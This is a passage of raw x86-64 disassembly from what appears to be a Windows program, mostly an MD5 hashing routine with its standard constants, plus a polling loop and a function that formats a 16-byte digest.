   140003b11:	eb 13                	jmp    0x140003b26
   140003b13:	80 3d b6 a6 00 00 00 	cmpb   $0x0,0xa6b6(%rip)        # 0x14000e1d0
   140003b1a:	75 3c                	jne    0x140003b58
   140003b1c:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   140003b21:	e8 f6 2d 00 00       	call   0x14000691c
   140003b26:	e8 5d 25 00 00       	call   0x140006088
   140003b2b:	84 c0                	test   %al,%al
   140003b2d:	74 e4                	je     0x140003b13
   140003b2f:	eb 1e                	jmp    0x140003b4f
   140003b31:	e8 96 1e 00 00       	call   0x1400059cc
   140003b36:	e8 21 22 00 00       	call   0x140005d5c
   140003b3b:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003b40:	e8 c3 1b 00 00       	call   0x140005708
   140003b45:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   140003b4a:	e8 cd 2d 00 00       	call   0x14000691c
   140003b4f:	80 3d 7a a6 00 00 00 	cmpb   $0x0,0xa67a(%rip)        # 0x14000e1d0
   140003b56:	74 d9                	je     0x140003b31
   140003b58:	ff 15 92 46 00 00    	call   *0x4692(%rip)        # 0x1400081f0
   140003b5e:	48 8d 0d 73 a6 00 00 	lea    0xa673(%rip),%rcx        # 0x14000e1d8
   140003b65:	e8 16 32 00 00       	call   0x140006d80
   140003b6a:	33 c9                	xor    %ecx,%ecx
   140003b6c:	48 83 c4 28          	add    $0x28,%rsp
   140003b70:	48 ff 25 81 46 00 00 	rex.W jmp *0x4681(%rip)        # 0x1400081f8
   140003b77:	cc                   	int3
   140003b78:	cc                   	int3
   140003b79:	cc                   	int3
   140003b7a:	cc                   	int3
   140003b7b:	cc                   	int3
   140003b7c:	cc                   	int3
   140003b7d:	cc                   	int3
   140003b7e:	cc                   	int3
   140003b7f:	cc                   	int3
   140003b80:	e9 f3 25 00 00       	jmp    0x140006178
   140003b85:	cc                   	int3
   140003b86:	cc                   	int3
   140003b87:	cc                   	int3
   140003b88:	cc                   	int3
   140003b89:	cc                   	int3
   140003b8a:	cc                   	int3
   140003b8b:	cc                   	int3
   140003b8c:	cc                   	int3
   140003b8d:	cc                   	int3
   140003b8e:	cc                   	int3
   140003b8f:	cc                   	int3
   140003b90:	40 53                	rex push %rbx
   140003b92:	48 83 ec 20          	sub    $0x20,%rsp
   140003b96:	33 c9                	xor    %ecx,%ecx
   140003b98:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   140003b9d:	e8 da 1c 00 00       	call   0x14000587c
   140003ba2:	48 8b c8             	mov    %rax,%rcx
   140003ba5:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140003baa:	b2 01                	mov    $0x1,%dl
   140003bac:	e8 7b 11 00 00       	call   0x140004d2c
   140003bb1:	80 7c 24 30 00       	cmpb   $0x0,0x30(%rsp)
   140003bb6:	8a d8                	mov    %al,%bl
   140003bb8:	74 0c                	je     0x140003bc6
   140003bba:	48 8d 0d 2f 00 00 00 	lea    0x2f(%rip),%rcx        # 0x140003bf0
   140003bc1:	e8 06 1b 00 00       	call   0x1400056cc
   140003bc6:	8a c3                	mov    %bl,%al
   140003bc8:	48 83 c4 20          	add    $0x20,%rsp
   140003bcc:	5b                   	pop    %rbx
   140003bcd:	c3                   	ret
   140003bce:	cc                   	int3
   140003bcf:	cc                   	int3
   140003bd0:	48 83 ec 28          	sub    $0x28,%rsp
   140003bd4:	80 3d 1d a6 00 00 00 	cmpb   $0x0,0xa61d(%rip)        # 0x14000e1f8
   140003bdb:	75 0b                	jne    0x140003be8
   140003bdd:	e8 96 db ff ff       	call   0x140001778
   140003be2:	88 05 10 a6 00 00    	mov    %al,0xa610(%rip)        # 0x14000e1f8
   140003be8:	b0 01                	mov    $0x1,%al
   140003bea:	48 83 c4 28          	add    $0x28,%rsp
   140003bee:	c3                   	ret
   140003bef:	cc                   	int3
   140003bf0:	48 83 ec 28          	sub    $0x28,%rsp
   140003bf4:	e8 83 0e 00 00       	call   0x140004a7c
   140003bf9:	84 c0                	test   %al,%al
   140003bfb:	75 0a                	jne    0x140003c07
   140003bfd:	e8 2e 12 00 00       	call   0x140004e30
   140003c02:	e8 b1 10 00 00       	call   0x140004cb8
   140003c07:	48 83 c4 28          	add    $0x28,%rsp
   140003c0b:	e9 6c 0e 00 00       	jmp    0x140004a7c
   140003c10:	e9 8f 28 00 00       	jmp    0x1400064a4
   140003c15:	cc                   	int3
   140003c16:	cc                   	int3
   140003c17:	cc                   	int3
   140003c18:	cc                   	int3
   140003c19:	cc                   	int3
   140003c1a:	cc                   	int3
   140003c1b:	cc                   	int3
   140003c1c:	cc                   	int3
   140003c1d:	cc                   	int3
   140003c1e:	cc                   	int3
   140003c1f:	cc                   	int3
   140003c20:	40 53                	rex push %rbx
   140003c22:	48 83 ec 20          	sub    $0x20,%rsp
   140003c26:	33 db                	xor    %ebx,%ebx
   140003c28:	e8 2f fd ff ff       	call   0x14000395c
   140003c2d:	84 c0                	test   %al,%al
   140003c2f:	75 0a                	jne    0x140003c3b
   140003c31:	e8 ee fc ff ff       	call   0x140003924
   140003c36:	bb 01 00 00 c0       	mov    $0xc0000001,%ebx
   140003c3b:	8b c3                	mov    %ebx,%eax
   140003c3d:	48 83 c4 20          	add    $0x20,%rsp
   140003c41:	5b                   	pop    %rbx
   140003c42:	c3                   	ret
   140003c43:	cc                   	int3
   140003c44:	40 53                	rex push %rbx
   140003c46:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140003c4d:	48 8b 05 8c 64 00 00 	mov    0x648c(%rip),%rax        # 0x14000a0e0
   140003c54:	48 33 c4             	xor    %rsp,%rax
   140003c57:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140003c5e:	00 
   140003c5f:	83 64 24 34 00       	andl   $0x0,0x34(%rsp)
   140003c64:	49 8b d8             	mov    %r8,%rbx
   140003c67:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   140003c6c:	44 8b c2             	mov    %edx,%r8d
   140003c6f:	48 8b d1             	mov    %rcx,%rdx
   140003c72:	c7 44 24 20 01 23 45 	movl   $0x67452301,0x20(%rsp)
   140003c79:	67 
   140003c7a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003c7f:	c7 44 24 24 89 ab cd 	movl   $0xefcdab89,0x24(%rsp)
   140003c86:	ef 
   140003c87:	c7 44 24 28 fe dc ba 	movl   $0x98badcfe,0x28(%rsp)
   140003c8e:	98 
   140003c8f:	c7 44 24 2c 76 54 32 	movl   $0x10325476,0x2c(%rsp)
   140003c96:	10 
   140003c97:	e8 a4 0a 00 00       	call   0x140004740
   140003c9c:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003ca1:	48 8b cb             	mov    %rbx,%rcx
   140003ca4:	e8 1f 01 00 00       	call   0x140003dc8
   140003ca9:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140003cb0:	00 
   140003cb1:	48 33 cc             	xor    %rsp,%rcx
   140003cb4:	e8 77 33 00 00       	call   0x140007030
   140003cb9:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140003cc0:	5b                   	pop    %rbx
   140003cc1:	c3                   	ret
   140003cc2:	cc                   	int3
   140003cc3:	cc                   	int3
   140003cc4:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140003cc9:	55                   	push   %rbp
   140003cca:	56                   	push   %rsi
   140003ccb:	57                   	push   %rdi
   140003ccc:	41 54                	push   %r12
   140003cce:	41 55                	push   %r13
   140003cd0:	41 56                	push   %r14
   140003cd2:	41 57                	push   %r15
   140003cd4:	48 8d 6c 24 d9       	lea    -0x27(%rsp),%rbp
   140003cd9:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   140003ce0:	48 8b 05 f9 63 00 00 	mov    0x63f9(%rip),%rax        # 0x14000a0e0
   140003ce7:	48 33 c4             	xor    %rsp,%rax
   140003cea:	48 89 45 1f          	mov    %rax,0x1f(%rbp)
   140003cee:	4c 89 45 07          	mov    %r8,0x7(%rbp)
   140003cf2:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003cf5:	4c 8d 45 0f          	lea    0xf(%rbp),%r8
   140003cf9:	0f 11 45 0f          	movups %xmm0,0xf(%rbp)
   140003cfd:	e8 42 ff ff ff       	call   0x140003c44
   140003d02:	0f b6 45 1e          	movzbl 0x1e(%rbp),%eax
   140003d06:	0f b6 55 1d          	movzbl 0x1d(%rbp),%edx
   140003d0a:	44 0f b6 55 1c       	movzbl 0x1c(%rbp),%r10d
   140003d0f:	44 0f b6 5d 1b       	movzbl 0x1b(%rbp),%r11d
   140003d14:	0f b6 4d 13          	movzbl 0x13(%rbp),%ecx
   140003d18:	0f b6 5d 1a          	movzbl 0x1a(%rbp),%ebx
   140003d1c:	0f b6 7d 19          	movzbl 0x19(%rbp),%edi
   140003d20:	0f b6 75 18          	movzbl 0x18(%rbp),%esi
   140003d24:	44 0f b6 75 17       	movzbl 0x17(%rbp),%r14d
   140003d29:	44 0f b6 7d 16       	movzbl 0x16(%rbp),%r15d
   140003d2e:	44 0f b6 65 15       	movzbl 0x15(%rbp),%r12d
   140003d33:	44 0f b6 6d 14       	movzbl 0x14(%rbp),%r13d
   140003d38:	44 0f b6 4d 10       	movzbl 0x10(%rbp),%r9d
   140003d3d:	44 0f b6 45 0f       	movzbl 0xf(%rbp),%r8d
   140003d42:	89 84 24 88 00 00 00 	mov    %eax,0x88(%rsp)
   140003d49:	0f b6 45 12          	movzbl 0x12(%rbp),%eax
   140003d4d:	89 94 24 80 00 00 00 	mov    %edx,0x80(%rsp)
   140003d54:	48 8d 15 c5 38 00 00 	lea    0x38c5(%rip),%rdx        # 0x140007620
   140003d5b:	44 89 54 24 78       	mov    %r10d,0x78(%rsp)
   140003d60:	44 89 5c 24 70       	mov    %r11d,0x70(%rsp)
   140003d65:	89 5c 24 68          	mov    %ebx,0x68(%rsp)
   140003d69:	89 7c 24 60          	mov    %edi,0x60(%rsp)
   140003d6d:	89 74 24 58          	mov    %esi,0x58(%rsp)
   140003d71:	44 89 74 24 50       	mov    %r14d,0x50(%rsp)
   140003d76:	44 89 7c 24 48       	mov    %r15d,0x48(%rsp)
   140003d7b:	44 89 64 24 40       	mov    %r12d,0x40(%rsp)
   140003d80:	44 89 6c 24 38       	mov    %r13d,0x38(%rsp)
   140003d85:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   140003d89:	48 8b 4d 07          	mov    0x7(%rbp),%rcx
   140003d8d:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140003d91:	0f b6 45 11          	movzbl 0x11(%rbp),%eax
   140003d95:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140003d99:	e8 44 32 00 00       	call   0x140006fe2
   140003d9e:	48 8b 4d 1f          	mov    0x1f(%rbp),%rcx
   140003da2:	48 33 cc             	xor    %rsp,%rcx
   140003da5:	e8 86 32 00 00       	call   0x140007030
   140003daa:	48 8b 9c 24 08 01 00 	mov    0x108(%rsp),%rbx
   140003db1:	00 
   140003db2:	48 81 c4 b0 00 00 00 	add    $0xb0,%rsp
   140003db9:	41 5f                	pop    %r15
   140003dbb:	41 5e                	pop    %r14
   140003dbd:	41 5d                	pop    %r13
   140003dbf:	41 5c                	pop    %r12
   140003dc1:	5f                   	pop    %rdi
   140003dc2:	5e                   	pop    %rsi
   140003dc3:	5d                   	pop    %rbp
   140003dc4:	c3                   	ret
   140003dc5:	cc                   	int3
   140003dc6:	cc                   	int3
   140003dc7:	cc                   	int3
   140003dc8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003dcd:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003dd2:	57                   	push   %rdi
   140003dd3:	48 83 ec 30          	sub    $0x30,%rsp
   140003dd7:	48 8b 05 02 63 00 00 	mov    0x6302(%rip),%rax        # 0x14000a0e0
   140003dde:	48 33 c4             	xor    %rsp,%rax
   140003de1:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003de6:	33 ff                	xor    %edi,%edi
   140003de8:	48 8b da             	mov    %rdx,%rbx
   140003deb:	48 8b f1             	mov    %rcx,%rsi
   140003dee:	48 8d 54 24 22       	lea    0x22(%rsp),%rdx
   140003df3:	44 8b c7             	mov    %edi,%r8d
   140003df6:	44 8d 4f 02          	lea    0x2(%rdi),%r9d
   140003dfa:	41 8b c8             	mov    %r8d,%ecx
   140003dfd:	41 ff c0             	inc    %r8d
   140003e00:	8a 44 8b 10          	mov    0x10(%rbx,%rcx,4),%al
   140003e04:	88 42 fe             	mov    %al,-0x2(%rdx)
   140003e07:	8a 44 8b 11          	mov    0x11(%rbx,%rcx,4),%al
   140003e0b:	88 42 ff             	mov    %al,-0x1(%rdx)
   140003e0e:	8a 44 8b 12          	mov    0x12(%rbx,%rcx,4),%al
   140003e12:	88 02                	mov    %al,(%rdx)
   140003e14:	48 8d 52 04          	lea    0x4(%rdx),%rdx
   140003e18:	8a 44 8b 13          	mov    0x13(%rbx,%rcx,4),%al
   140003e1c:	88 42 fd             	mov    %al,-0x3(%rdx)
   140003e1f:	49 83 e9 01          	sub    $0x1,%r9
   140003e23:	75 d5                	jne    0x140003dfa
   140003e25:	8b 4b 10             	mov    0x10(%rbx),%ecx
   140003e28:	41 8d 41 38          	lea    0x38(%r9),%eax
   140003e2c:	c1 e9 03             	shr    $0x3,%ecx
   140003e2f:	45 8d 41 78          	lea    0x78(%r9),%r8d
   140003e33:	83 e1 3f             	and    $0x3f,%ecx
   140003e36:	48 8d 15 f3 61 00 00 	lea    0x61f3(%rip),%rdx        # 0x14000a030
   140003e3d:	2b c1                	sub    %ecx,%eax
   140003e3f:	44 2b c1             	sub    %ecx,%r8d
   140003e42:	83 f9 38             	cmp    $0x38,%ecx
   140003e45:	48 8b cb             	mov    %rbx,%rcx
   140003e48:	44 0f 42 c0          	cmovb  %eax,%r8d
   140003e4c:	e8 ef 08 00 00       	call   0x140004740
   140003e51:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140003e57:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003e5c:	48 8b cb             	mov    %rbx,%rcx
   140003e5f:	e8 dc 08 00 00       	call   0x140004740
   140003e64:	48 8d 4e 02          	lea    0x2(%rsi),%rcx
   140003e68:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140003e6e:	8a 04 bb             	mov    (%rbx,%rdi,4),%al
   140003e71:	88 41 fe             	mov    %al,-0x2(%rcx)
   140003e74:	8a 44 bb 01          	mov    0x1(%rbx,%rdi,4),%al
   140003e78:	88 41 ff             	mov    %al,-0x1(%rcx)
   140003e7b:	8a 44 bb 02          	mov    0x2(%rbx,%rdi,4),%al
   140003e7f:	88 01                	mov    %al,(%rcx)
   140003e81:	48 8d 49 04          	lea    0x4(%rcx),%rcx
   140003e85:	8a 44 bb 03          	mov    0x3(%rbx,%rdi,4),%al
   140003e89:	ff c7                	inc    %edi
   140003e8b:	88 41 fd             	mov    %al,-0x3(%rcx)
   140003e8e:	49 83 e8 01          	sub    $0x1,%r8
   140003e92:	75 da                	jne    0x140003e6e
   140003e94:	33 d2                	xor    %edx,%edx
   140003e96:	48 8b cb             	mov    %rbx,%rcx
   140003e99:	44 8d 42 58          	lea    0x58(%rdx),%r8d
   140003e9d:	e8 9e 32 00 00       	call   0x140007140
   140003ea2:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140003ea7:	48 33 cc             	xor    %rsp,%rcx
   140003eaa:	e8 81 31 00 00       	call   0x140007030
   140003eaf:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140003eb4:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140003eb9:	48 83 c4 30          	add    $0x30,%rsp
   140003ebd:	5f                   	pop    %rdi
   140003ebe:	c3                   	ret
   140003ebf:	cc                   	int3
   140003ec0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003ec5:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140003eca:	55                   	push   %rbp
   140003ecb:	48 8b ec             	mov    %rsp,%rbp
   140003ece:	48 83 ec 70          	sub    $0x70,%rsp
   140003ed2:	48 8b 05 07 62 00 00 	mov    0x6207(%rip),%rax        # 0x14000a0e0
   140003ed9:	48 33 c4             	xor    %rsp,%rax
   140003edc:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140003ee0:	8b 39                	mov    (%rcx),%edi
   140003ee2:	45 33 c0             	xor    %r8d,%r8d
   140003ee5:	44 8b 51 04          	mov    0x4(%rcx),%r10d
   140003ee9:	48 83 c2 02          	add    $0x2,%rdx
   140003eed:	44 8b 59 08          	mov    0x8(%rcx),%r11d
   140003ef1:	8b 59 0c             	mov    0xc(%rcx),%ebx
   140003ef4:	45 8d 48 10          	lea    0x10(%r8),%r9d
   140003ef8:	48 89 4d a0          	mov    %rcx,-0x60(%rbp)
   140003efc:	89 7d 90             	mov    %edi,-0x70(%rbp)
   140003eff:	44 89 55 94          	mov    %r10d,-0x6c(%rbp)
   140003f03:	44 89 5d 98          	mov    %r11d,-0x68(%rbp)
   140003f07:	89 5d 9c             	mov    %ebx,-0x64(%rbp)
   140003f0a:	0f b6 02             	movzbl (%rdx),%eax
   140003f0d:	0f b6 4a 01          	movzbl 0x1(%rdx),%ecx
   140003f11:	48 8d 52 04          	lea    0x4(%rdx),%rdx
   140003f15:	c1 e1 08             	shl    $0x8,%ecx
   140003f18:	0b c8                	or     %eax,%ecx
   140003f1a:	0f b6 42 fb          	movzbl -0x5(%rdx),%eax
   140003f1e:	c1 e1 08             	shl    $0x8,%ecx
   140003f21:	0b c8                	or     %eax,%ecx
   140003f23:	0f b6 42 fa          	movzbl -0x6(%rdx),%eax
   140003f27:	c1 e1 08             	shl    $0x8,%ecx
   140003f2a:	0b c8                	or     %eax,%ecx
   140003f2c:	42 89 4c 85 b0       	mov    %ecx,-0x50(%rbp,%r8,4)
   140003f31:	41 ff c0             	inc    %r8d
   140003f34:	49 83 e9 01          	sub    $0x1,%r9
   140003f38:	75 d0                	jne    0x140003f0a
   140003f3a:	41 8b ca             	mov    %r10d,%ecx
   140003f3d:	45 8d 8b db 70 20 24 	lea    0x242070db(%r11),%r9d
   140003f44:	f7 d1                	not    %ecx
   140003f46:	8d 97 78 a4 6a d7    	lea    -0x28955b88(%rdi),%edx
   140003f4c:	23 cb                	and    %ebx,%ecx
   140003f4e:	44 8d 83 56 b7 c7 e8 	lea    -0x173848aa(%rbx),%r8d
   140003f55:	41 8b c3             	mov    %r11d,%eax
   140003f58:	41 23 c2             	and    %r10d,%eax
   140003f5b:	0b c8                	or     %eax,%ecx
   140003f5d:	41 8b c2             	mov    %r10d,%eax
   140003f60:	03 4d b0             	add    -0x50(%rbp),%ecx
   140003f63:	03 d1                	add    %ecx,%edx
   140003f65:	c1 c2 07             	rol    $0x7,%edx
   140003f68:	41 03 d2             	add    %r10d,%edx
   140003f6b:	23 c2                	and    %edx,%eax
   140003f6d:	8b ca                	mov    %edx,%ecx
   140003f6f:	f7 d1                	not    %ecx
   140003f71:	41 23 cb             	and    %r11d,%ecx
   140003f74:	0b c8                	or     %eax,%ecx
   140003f76:	44 8d 9a af 0f 7c f5 	lea    -0xa83f051(%rdx),%r11d
   140003f7d:	03 4d b4             	add    -0x4c(%rbp),%ecx
   140003f80:	44 03 c1             	add    %ecx,%r8d
   140003f83:	41 c1 c0 0c          	rol    $0xc,%r8d
   140003f87:	44 03 c2             	add    %edx,%r8d
   140003f8a:	41 8b c8             	mov    %r8d,%ecx
   140003f8d:	41 8b c0             	mov    %r8d,%eax
   140003f90:	f7 d1                	not    %ecx
   140003f92:	23 c2                	and    %edx,%eax
   140003f94:	41 23 ca             	and    %r10d,%ecx
   140003f97:	41 81 c2 ee ce bd c1 	add    $0xc1bdceee,%r10d
   140003f9e:	0b c8                	or     %eax,%ecx
   140003fa0:	41 8b c0             	mov    %r8d,%eax
   140003fa3:	03 4d b8             	add    -0x48(%rbp),%ecx
   140003fa6:	44 03 c9             	add    %ecx,%r9d
   140003fa9:	41 c1 c9 0f          	ror    $0xf,%r9d
   140003fad:	45 03 c8             	add    %r8d,%r9d
   140003fb0:	41 23 c1             	and    %r9d,%eax
   140003fb3:	41 8b c9             	mov    %r9d,%ecx
   140003fb6:	f7 d1                	not    %ecx
   140003fb8:	23 ca                	and    %edx,%ecx
   140003fba:	41 8d 90 2a c6 87 47 	lea    0x4787c62a(%r8),%edx
   140003fc1:	0b c8                	or     %eax,%ecx
   140003fc3:	41 8b c1             	mov    %r9d,%eax
   140003fc6:	03 4d bc             	add    -0x44(%rbp),%ecx
   140003fc9:	44 03 d1             	add    %ecx,%r10d
   140003fcc:	41 c1 ca 0a          	ror    $0xa,%r10d
   140003fd0:	45 03 d1             	add    %r9d,%r10d
   140003fd3:	41 23 c2             	and    %r10d,%eax
   140003fd6:	41 8b ca             	mov    %r10d,%ecx
   140003fd9:	f7 d1                	not    %ecx
   140003fdb:	41 23 c8             	and    %r8d,%ecx
   140003fde:	45 8d 81 13 46 30 a8 	lea    -0x57cfb9ed(%r9),%r8d
   140003fe5:	0b c8                	or     %eax,%ecx
   140003fe7:	41 8b c2             	mov    %r10d,%eax
   140003fea:	03 4d c0             	add    -0x40(%rbp),%ecx
   140003fed:	44 03 d9             	add    %ecx,%r11d
   140003ff0:	41 c1 c3 07          	rol    $0x7,%r11d
   140003ff4:	45 03 da             	add    %r10d,%r11d
   140003ff7:	41 23 c3             	and    %r11d,%eax
   140003ffa:	41 8b cb             	mov    %r11d,%ecx
   140003ffd:	f7 d1                	not    %ecx
   140003fff:	41 23 c9             	and    %r9d,%ecx
   140004002:	0b c8                	or     %eax,%ecx
   140004004:	03 4d c4             	add    -0x3c(%rbp),%ecx
   140004007:	03 d1                	add    %ecx,%edx
   140004009:	c1 c2 0c             	rol    $0xc,%edx
   14000400c:	41 03 d3             	add    %r11d,%edx
   14000400f:	8b ca                	mov    %edx,%ecx
   140004011:	8b c2                	mov    %edx,%eax
   140004013:	f7 d1                	not    %ecx
   140004015:	41 23 c3             	and    %r11d,%eax
   140004018:	41 23 ca             	and    %r10d,%ecx
   14000401b:	0b c8                	or     %eax,%ecx
   14000401d:	8b c2                	mov    %edx,%eax
   14000401f:	03 4d c8             	add    -0x38(%rbp),%ecx
   140004022:	44 03 c1             	add    %ecx,%r8d
   140004025:	41 c1 c8 0f          	ror    $0xf,%r8d
   140004029:	44 03 c2             	add    %edx,%r8d
   14000402c:	41 8b c8             	mov    %r8d,%ecx
   14000402f:	f7 d1                	not    %ecx
   140004031:	41 23 cb             	and    %r11d,%ecx
   140004034:	41 23 c0             	and    %r8d,%eax
   140004037:	45 8d 8a 01 95 46 fd 	lea    -0x2b96aff(%r10),%r9d
   14000403e:	0b c8                	or     %eax,%ecx
   140004040:	41 8b c0             	mov    %r8d,%eax
   140004043:	03 4d cc             	add    -0x34(%rbp),%ecx
   140004046:	44 03 c9             	add    %ecx,%r9d
   140004049:	41 c1 c9 0a          	ror    $0xa,%r9d
   14000404d:	45 03 c8             	add    %r8d,%r9d
   140004050:	41 23 c1             	and    %r9d,%eax
   140004053:	45 8b d1             	mov    %r9d,%r10d
   140004056:	41 f7 d2             	not    %r10d
   140004059:	44 23 d2             	and    %edx,%r10d
   14000405c:	44 0b d0             	or     %eax,%r10d
   14000405f:	41 8b c1             	mov    %r9d,%eax
   140004062:	41 81 c2 d8 98 80 69 	add    $0x698098d8,%r10d
   140004069:	44 03 55 d0          	add    -0x30(%rbp),%r10d
   14000406d:	45 03 d3             	add    %r11d,%r10d
   140004070:	41 c1 c2 07          	rol    $0x7,%r10d
   140004074:	45 03 d1             	add    %r9d,%r10d
   140004077:	41 23 c2             	and    %r10d,%eax
   14000407a:	41 8b ca             	mov    %r10d,%ecx
   14000407d:	f7 d1                	not    %ecx
   14000407f:	41 23 c8             	and    %r8d,%ecx
   140004082:	0b c8                	or     %eax,%ecx
   140004084:	45 8d 9a 22 11 90 6b 	lea    0x6b901122(%r10),%r11d
   14000408b:	81 c1 af f7 44 8b    	add    $0x8b44f7af,%ecx
   140004091:	03 4d d4             	add    -0x2c(%rbp),%ecx
   140004094:	03 d1                	add    %ecx,%edx
   140004096:	c1 c2 0c             	rol    $0xc,%edx
   140004099:	41 03 d2             	add    %r10d,%edx
   14000409c:	8b fa                	mov    %edx,%edi
   14000409e:	8b c2                	mov    %edx,%eax
   1400040a0:	41 23 c2             	and    %r10d,%eax
   1400040a3:	f7 d7                	not    %edi
   1400040a5:	41 23 f9             	and    %r9d,%edi
   1400040a8:	0b f8                	or     %eax,%edi
   1400040aa:	8d 9a 93 71 98 fd    	lea    -0x2678e6d(%rdx),%ebx
   1400040b0:	81 c7 b1 5b ff ff    	add    $0xffff5bb1,%edi
   1400040b6:	8b c2                	mov    %edx,%eax
   1400040b8:	03 7d d8             	add    -0x28(%rbp),%edi
   1400040bb:	41 03 f8             	add    %r8d,%edi
   1400040be:	c1 cf 0f             	ror    $0xf,%edi
   1400040c1:	03 fa                	add    %edx,%edi
   1400040c3:	23 c7                	and    %edi,%eax
   1400040c5:	8b cf                	mov    %edi,%ecx
   1400040c7:	f7 d1                	not    %ecx
   1400040c9:	41 23 ca             	and    %r10d,%ecx
   1400040cc:	0b c8                	or     %eax,%ecx
   1400040ce:	8b c7                	mov    %edi,%eax
   1400040d0:	81 c1 be d7 5c 89    	add    $0x895cd7be,%ecx
   1400040d6:	03 4d dc             	add    -0x24(%rbp),%ecx
   1400040d9:	44 03 c9             	add    %ecx,%r9d
   1400040dc:	41 c1 c9 0a          	ror    $0xa,%r9d
   1400040e0:	44 03 cf             	add    %edi,%r9d
   1400040e3:	41 23 c1             	and    %r9d,%eax
   1400040e6:	41 8b c9             	mov    %r9d,%ecx
   1400040e9:	f7 d1                	not    %ecx
   1400040eb:	23 ca                	and    %edx,%ecx
   1400040ed:	0b c8                	or     %eax,%ecx
   1400040ef:	41 8b c1             	mov    %r9d,%eax
   1400040f2:	03 4d e0             	add    -0x20(%rbp),%ecx
   1400040f5:	44 03 d9             	add    %ecx,%r11d
   1400040f8:	41 c1 c3 07          	rol    $0x7,%r11d
   1400040fc:	45 03 d9             	add    %r9d,%r11d
   1400040ff:	41 23 c3             	and    %r11d,%eax
   140004102:	41 8b cb             	mov    %r11d,%ecx
   140004105:	f7 d1                	not    %ecx
   140004107:	23 cf                	and    %edi,%ecx
   140004109:	0b c8                	or     %eax,%ecx
   14000410b:	03 4d e4             	add    -0x1c(%rbp),%ecx
   14000410e:	03 d9                	add    %ecx,%ebx
   140004110:	c1 c3 0c             	rol    $0xc,%ebx
   140004113:	41 03 db             	add    %r11d,%ebx
   140004116:	44 8b c3             	mov    %ebx,%r8d
   140004119:	8b c3                	mov    %ebx,%eax
   14000411b:	41 23 c3             	and    %r11d,%eax
   14000411e:	41 f7 d0             	not    %r8d
   140004121:	41 8b c8             	mov    %r8d,%ecx
   140004124:	41 23 c9             	and    %r9d,%ecx
   140004127:	0b c8                	or     %eax,%ecx
   140004129:	03 4d e8             	add    -0x18(%rbp),%ecx
   14000412c:	44 8d 97 8e 43 79 a6 	lea    -0x5986bc72(%rdi),%r10d
   140004133:	8b c3                	mov    %ebx,%eax
   140004135:	44 03 d1             	add    %ecx,%r10d
   140004138:	8b 7d ec             	mov    -0x14(%rbp),%edi
   14000413b:	41 c1 ca 0f          	ror    $0xf,%r10d
   14000413f:	44 03 d3             	add    %ebx,%r10d
   140004142:	41 23 c2             	and    %r10d,%eax
   140004145:	45 23 c2             	and    %r10d,%r8d
   140004148:	41 8b d2             	mov    %r10d,%edx
   14000414b:	f7 d2                	not    %edx
   14000414d:	8b ca                	mov    %edx,%ecx
   14000414f:	41 23 cb             	and    %r11d,%ecx
   140004152:	0b c8                	or     %eax,%ecx
   140004154:	8b c3                	mov    %ebx,%eax
   140004156:	81 c1 21 08 b4 49    	add    $0x49b40821,%ecx
   14000415c:	03 cf                	add    %edi,%ecx
   14000415e:	44 03 c9             	add    %ecx,%r9d
   140004161:	41 c1 c9 0a          	ror    $0xa,%r9d
   140004165:	45 03 ca             	add    %r10d,%r9d
   140004168:	41 23 c1             	and    %r9d,%eax
   14000416b:	41 23 d1             	and    %r9d,%edx
   14000416e:	44 0b c0             	or     %eax,%r8d
   140004171:	41 8b c9             	mov    %r9d,%ecx
   140004174:	f7 d1                	not    %ecx
   140004176:	41 81 c0 62 25 1e f6 	add    $0xf61e2562,%r8d
   14000417d:	44 03 45 b4          	add    -0x4c(%rbp),%r8d
   140004181:	45 03 d8             	add    %r8d,%r11d
   140004184:	45 8b c2             	mov    %r10d,%r8d
   140004187:	41 c1 c3 05          	rol    $0x5,%r11d
   14000418b:	45 03 d9             	add    %r9d,%r11d
   14000418e:	41 23 cb             	and    %r11d,%ecx
   140004191:	45 23 c3             	and    %r11d,%r8d
   140004194:	44 0b c2             	or     %edx,%r8d
   140004197:	41 8d 92 51 5a 5e 26 	lea    0x265e5a51(%r10),%edx
   14000419e:	41 81 c0 40 b3 40 c0 	add    $0xc040b340,%r8d
   1400041a5:	45 8d 91 aa c7 b6 e9 	lea    -0x16493856(%r9),%r10d
   1400041ac:	44 03 45 c8          	add    -0x38(%rbp),%r8d
   1400041b0:	44 03 c3             	add    %ebx,%r8d
   1400041b3:	41 c1 c0 09          	rol    $0x9,%r8d
   1400041b7:	45 03 c3             	add    %r11d,%r8d
   1400041ba:	41 8b c0             	mov    %r8d,%eax
   1400041bd:	41 23 c1             	and    %r9d,%eax
   1400041c0:	45 8d 8b 5d 10 2f d6 	lea    -0x29d0efa3(%r11),%r9d
   1400041c7:	0b c8                	or     %eax,%ecx
   1400041c9:	03 4d dc             	add    -0x24(%rbp),%ecx
   1400041cc:	03 d1                	add    %ecx,%edx
